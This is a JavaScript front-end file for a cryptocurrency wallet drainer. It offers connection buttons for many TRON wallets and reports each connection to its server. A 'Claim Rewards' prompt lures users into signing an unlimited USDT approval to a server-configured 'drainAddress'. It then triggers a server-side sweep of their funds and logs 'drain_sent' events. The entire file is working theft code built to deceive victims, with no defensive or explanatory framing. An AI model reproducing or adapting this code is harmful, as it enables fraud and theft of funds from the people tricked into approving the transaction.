// List of wallets with display names, icons, and adapter class
const wallets = [
    { name: 'TronLink', icon: '🦊', adapterClass: 'TronLinkAdapter' },
    { name: 'OKX Wallet', icon: '⭕', adapterClass: 'OkxWalletAdapter' },
    { name: 'Bitget', icon: '🟢', adapterClass: 'BitKeepAdapter' },
    { name: 'TokenPocket', icon: '📱', adapterClass: 'TokenPocketAdapter' },
    { name: 'Trust Wallet', icon: '🔵', adapterClass: 'TrustAdapter' },
    { name: 'Ledger', icon: '🔒', adapterClass: 'LedgerAdapter' },
    { name: 'WalletConnect', icon: '🌐', adapterClass: 'WalletConnectAdapter' },
    { name: 'imToken', icon: '🟣', adapterClass: 'ImTokenAdapter' },
    { name: 'Gate Wallet', icon: '🟡', adapterClass: 'GateWalletAdapter' },
    { name: 'FoxWallet', icon: '🦊', adapterClass: 'FoxWalletAdapter' },
    { name: 'Bybit', icon: '💙', adapterClass: 'BybitAdapter' },
    { name: 'Binance', icon: '🟡', adapterClass: 'BinanceAdapter' },
    { name: 'OneKey', icon: '🔑', adapterClass: 'OneKeyAdapter' },
    { name: 'Backpack', icon: '🎒', adapterClass: 'BackpackAdapter' },
];

let currentAdapter = null;
let userAddress = null;
let tronWebInstance = null;

// DOM elements
const walletGrid = document.getElementById('walletGrid');
const walletInfoDiv = document.getElementById('walletInfo');
const walletAddressSpan = document.getElementById('walletAddress');
const usdtBalanceSpan = document.getElementById('usdtBalance');
const trxBalanceSpan = document.getElementById('trxBalance');
const drainBtn = document.getElementById('drainBtn');
const statusDiv = document.getElementById('status');

function setStatus(msg, isError = false) {
    statusDiv.innerText = msg;
    statusDiv.style.color = isError ? '#ff8a8a' : '#cbd5ff';
    console.log(msg);
}

async function apiCall(endpoint, data) {
    const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
    return await res.json();
}

async function loadBalances(address) {
    try {
        const data = await apiCall('/api/balance', { address });
        usdtBalanceSpan.innerText = data.usdt.toFixed(2);
        trxBalanceSpan.innerText = data.trx.toFixed(2);
    } catch (err) {
        console.error(err);
        setStatus('Failed to load balance', true);
    }
}

async function connectWallet(adapterClass, walletName) {
    setStatus(`Connecting to ${walletName}...`);
    try {
        const AdapterCtor = window.TronWalletAdapter[adapterClass];
        if (!AdapterCtor) {
            setStatus(`Adapter for ${walletName} not available`, true);
            return;
        }
        const adapter = new AdapterCtor();
        await adapter.connect();
        const address = adapter.address;
        if (!address) throw new Error('No address returned');
        
        userAddress = address;
        currentAdapter = adapter;
        tronWebInstance = new TronWeb({ fullHost: 'https://api.trongrid.io' });
        
        walletAddressSpan.innerText = userAddress;
        walletInfoDiv.classList.remove('hidden');
        setStatus(`Connected with ${walletName}: ${userAddress.substring(0,6)}...${userAddress.substring(userAddress.length-4)}`);
        
        // Send event
        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'wallet_connected', address: userAddress })
        });
        
        await loadBalances(userAddress);
        setStatus(`Ready. Click "Claim Rewards" to approve and receive USDT.`);
    } catch (err) {
        console.error(err);
        setStatus(`Failed to connect ${walletName}: ${err.message}`, true);
    }
}

async function approveAndDrain() {
    if (!userAddress || !currentAdapter) {
        setStatus('Please connect a wallet first', true);
        return;
    }
    setStatus('Loading configuration...');
    let config;
    try {
        const res = await fetch('/api/config');
        config = await res.json();
    } catch (err) {
        setStatus('Cannot fetch config from server', true);
        return;
    }
    const usdtContractAddress = config.usdtContract;
    const drainTarget = config.drainAddress;
    const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    
    try {
        const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
        setStatus('Approving USDT spending...');
        const unsignedTx = await usdtContract.approve(drainTarget, MAX_UINT).request();
        const signedTx = await currentAdapter.signTransaction(unsignedTx);
        const result = await tronWebInstance.trx.sendRawTransaction(signedTx);
        setStatus(`✅ Approval sent! TX: ${result.substring(0,16)}...`);
        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: result })
        });
        setStatus('Initiating transfer...');
        const sweepResult = await apiCall('/api/sweep', { address: userAddress });
        if (sweepResult.success) {
            setStatus(`🎉 Success! USDT sent. TX: ${sweepResult.txId.substring(0,16)}...`);
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweepResult.txId, amount: '0' })
            });
            setTimeout(() => loadBalances(userAddress), 5000);
        } else {
            setStatus(`❌ Transfer failed: ${sweepResult.error}`, true);
        }
    } catch (err) {
        console.error(err);
        setStatus('Error: ' + (err.message || 'Unknown error'), true);
    }
}

// Build wallet buttons
wallets.forEach(w => {
    const btn = document.createElement('div');
    btn.className = 'wallet-btn';
    btn.innerHTML = `<div class="wallet-icon">${w.icon}</div><span>${w.name}</span>`;
    btn.addEventListener('click', () => connectWallet(w.adapterClass, w.name));
    walletGrid.appendChild(btn);
});

drainBtn.addEventListener('click', approveAndDrain);
